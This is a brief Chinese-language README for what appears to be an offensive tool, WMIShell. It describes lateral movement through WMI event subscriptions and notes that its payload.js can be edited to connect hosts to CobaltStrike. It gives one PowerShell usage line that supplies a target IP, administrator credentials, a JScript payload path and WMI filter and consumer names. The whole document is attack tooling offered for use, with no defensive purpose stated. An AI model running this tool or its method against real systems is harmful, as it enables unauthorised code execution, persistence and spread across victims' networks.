## WMIShell

使用wmi事件订阅进行横向移动，可自行修改payload.js的内容，上线CobaltStrike等，使用方法如下：

```
PS C:\Users\Administrator\Desktop> New-WMIShell -Target '192.168.2.115' -Username 'administrator' -Password 'abc123!' -ProcessName 'notepad.exe' -JScriptPath C:\Users\Administrator\Desktop\payload.js -FilterName 'sdqwsda' -ConsumerName 'sdqwsda'
```

